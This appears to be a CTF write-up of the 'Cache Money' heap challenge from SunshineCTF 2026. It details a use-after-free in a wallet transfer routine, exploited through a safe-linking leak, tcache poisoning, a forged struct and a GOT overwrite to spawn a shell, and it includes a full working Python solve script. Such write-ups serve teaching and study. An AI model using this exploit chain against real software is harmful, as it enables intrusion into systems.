@@ -1,0 +1,187 @@
+---
+title: 'SunshineCTF 2026 - Cache Money'
+description: 'A transfer that frees a ledger and then copies the dangling pointer into the destination, turned into tcache poisoning, a forged wallet struct and a GOT overwrite'
+date: 2026-09-30
+tags: ['writeup', 'pwn', 'heap-exploitation', 'use-after-free', 'tcache-poisoning', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A crypto-wallet manager with the usual menu — open, deposit, withdraw, transfer, close, list. The transfer path frees the source ledger and then writes that **same, already-freed pointer** into the destination wallet, which stays active. That is a use-after-free with both a read and a write, and from there it is safe-linking arithmetic all the way to a GOT overwrite.
+
+## Challenge Description
+
+> The arcade's credit manager tracks every wallet in the house. The books haven't been audited in years, so help yourself.
+
+Provided: `cache_money`, `libc.so.6`, `ld-linux-x86-64.so.2`.
+
+## Initial Analysis
+
+```text
+Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+FORTIFY:    Enabled
+```
+
+No PIE, and Partial RELRO — so the GOT is at a fixed, writable address.
+
+Slots live in a 16-entry table at `0x41c0`, sixteen bytes each. Reversing the handlers gives the wallet layout:
+
+```text
++0x00   name      (16 bytes)
++0x10   balance
++0x18   ledger    (heap pointer)
++0x20   size
++0x28   active
+```
+
+Ledger sizes are clamped to `0x20..0x400` and every ledger is allocated with `calloc`, so a freshly opened wallet reads back as zeroes — there is no uninitialised-memory leak here. Withdraw prints the full `size` bytes of the ledger regardless of how much was deposited, which becomes the read primitive.
+
+## The Vulnerability
+
+`transfer` frees the source ledger and then re-reads the pointer it just freed:
+
+```asm
+401ac9:  mov    rdi,QWORD PTR [rbx+0x18]   ; src->ledger
+401acd:  call   401110 <free@plt>
+401ad2:  mov    rax,QWORD PTR [rbx+0x18]   ; re-reads the freed pointer
+401ae8:  mov    QWORD PTR [rbp+0x18],rax   ; dst->ledger = freed chunk
+401aec:  mov    rax,QWORD PTR [rbx+0x20]
+401af0:  mov    QWORD PTR [rbp+0x20],rax   ; dst->size = src->size
+401af4:  mov    rax,QWORD PTR [rbx+0x10]
+401af8:  add    QWORD PTR [rbp+0x10],rax   ; dst->balance += src->balance
+401afe:  mov    QWORD PTR [rbx+0x10],0x0
+401b0a:  mov    QWORD PTR [rbx+0x18],0x0   ; src cleared, dst left dangling
+```
+
+The source is tidied up properly. The destination is left pointing at a chunk that is now sitting in a tcache bin, and it is still marked active — so Withdraw reads freed memory and Deposit writes into it.
+
+## Exploitation
+
+### Heap leak
+
+After one transfer, Withdraw on the destination prints the freed chunk's first bytes:
+
+```text
+raw[:16]: 492002000000000014006c0da67a566d
+fd   = 0x22049    -> heap chunk in page 0x22049000
+key  = 0x6d567aa60d6c0014
+```
+
+The first qword is the safe-linked `fd`. For the first chunk in an empty tcache bin, `PROTECT_PTR(pos, NULL)` is `pos >> 12` — which is exactly the heap page number. That is all poisoning ever needs, because the mangling is `page ^ target`.
+
+For an exact address rather than just the page, free two chunks into the same bin. The second one's `fd` is `(B >> 12) ^ A`, and since both are on the same page, XORing with the page recovers `A`:
+
+```text
+page      = 0x369e4
+fd2       = 0x369d2b14
+A         = fd2 ^ page = 0x369e42f0
+```
+
+### tcache poisoning
+
+The first attempt at this silently did nothing, and the reason is worth stating plainly. With a single free in the bin, `tcache->counts` is **1**. Popping one chunk takes the count to zero, and `tcache_get` refuses to serve another entry from that bin no matter what the poisoned `fd` says — the allocator checks the count, not the list. So the second allocation goes to the top chunk and the target address is never returned.
+
+Two frees are needed *before* the poisoning write. And they have to be back to back: opening a wallet in between pops the freed chunk straight back out of the bin.
+
+```python
+def poison(self, size, target):
+    """Two frees first so tcache count is 2, then overwrite the head's fd."""
+    a1 = self.open(size, "a1"); b1 = self.open(size, "b1")
+    a2 = self.open(size, "a2"); b2 = self.open(size, "b2")
+    self.w.transfer(a1, b1)                      # count 1
+    page = struct.unpack("<Q", ledger_bytes(self.w.withdraw(b1))[:8])[0]
+    self.w.transfer(a2, b2)                      # count 2, head = X2
+    self.w.deposit(b2, p64(page ^ target))       # X2.fd = target
+    self.open(size, "q1")                        # pops X2   (count 1)
+    return self.open(size, "q2"), page           # pops target (count 0)
+```
+
+### Forging a wallet struct
+
+An allocation at an arbitrary address is not yet an arbitrary read, because `open` `calloc`s the chunk and zeroes it. The way through is to land the chunk **on another wallet's struct** rather than on the thing you want to read.
+
+The first wallet's struct sits at `heap_page + 0x2b0`: the `tcache_perthread_struct` occupies up to `+0x2a0`, and the struct is allocated before its ledger. Verified by poisoning a 32-byte ledger onto the *first wallet's ledger* at `+0x2f0` and watching its first 32 bytes zero out while the rest stayed intact:
+
+```text
+victim ledger[0:48]: b'\x00' * 32 + b'ZZZZZZZZZZZZZZZZ'
+```
+
+A 32-byte allocation on the struct zeroes only `name`, `balance` and `ledger` — `size` at `+0x20` and `active` at `+0x28` are past the end of the chunk and survive. So one deposit rewrites the struct into whatever is wanted:
+
+```python
+e.w.deposit(fake, b"P" * 16 + p64(0) + p64(FREE_GOT))   # name, balance=0, ledger=GOT
+```
+
+That wallet now reads and writes an arbitrary address, with its original `size` of 256 still intact.
+
+### Leak and win
+
+Pointing it at the GOT (`0x404000`, fixed — no PIE) dumps libc:
+
+```text
+  got+0x00 = 0x00007b11ceaadd20   free
+  got+0x08 = 0x00007b11cea87bd0   puts
+  got+0x10 = 0x00007b11ceb1c560   write
+  got+0x18 = 0x0000000000401060   __stack_chk_fail (unresolved)
+```
+
+`write@got` minus `0x11c560` gives the base, page-aligned as expected (Ubuntu GLIBC 2.39-0ubuntu8.3).
+
+For the finish, the same wallet writes `system` over `free@got`. Then Transfer is called on a wallet whose ledger holds `/bin/sh` — because transfer's first act is `free(src->ledger)`, with `rdi` already pointing at that string:
+
+```text
+total 12
+-rw-r----- 1 root cache_money 40 Sep 26 00:13 flag.txt
+sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
+```
+
+## Solve Script
+
+```python
+import struct, time
+from cm import Wallet, ledger_bytes      # prompt-synced client
+p64 = lambda x: struct.pack("<Q", x)
+
+FREE_GOT, WRITE_GOT = 0x404000, 0x404010
+WRITE_OFF, SYSTEM_OFF = 0x11c560, 0x58740
+STRUCT_OFF = 0x2b0        # first wallet's struct, relative to the heap page base
+
+def pwn(target, cwd=None):
+    e = Ex(target, cwd)
+    v  = e.open(256, "victim")           # its struct lands at base+0x2b0
+    sh = e.open(256, "shell")
+    e.w.deposit(sh, b"/bin/sh\x00")
+
+    _, page = e.uaf(32)
+    base = page << 12
+
+    fake, _ = e.poison(32, base + STRUCT_OFF)               # chunk on victim's struct
+    e.w.deposit(fake, b"P" * 16 + p64(0) + p64(FREE_GOT))   # ledger -> GOT
+
+    raw = ledger_bytes(e.w.withdraw(v))                     # arbitrary read
+    libc = struct.unpack("<Q", raw[WRITE_GOT - FREE_GOT:][:8])[0] - WRITE_OFF
+    assert not libc & 0xfff, "libc base not page aligned"
+
+    e.w.deposit(v, p64(libc + SYSTEM_OFF))                  # free@got = system
+    t = e.w.t                                               # transfer -> system("/bin/sh")
+    t.send("4\n");          t.until(b"(0-15): ")
+    t.send(f"{sh}\n");      t.until(b"(0-15): ")
+    t.send(f"{fake}\n")
+    time.sleep(1.0); t.drain(1.0)
+    t.send(b"cat flag*\n"); time.sleep(0.8)
+    return t.drain(1.0)
+
+print(pwn(("chal.sunshinectf.games", 26004)).decode())
+```
+
+The client syncs on prompt strings rather than sleeping. Time-based reads desync immediately over TCP, where a `recv` can return a partial menu.
+
+## Flag
+
+```text
+sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
+```
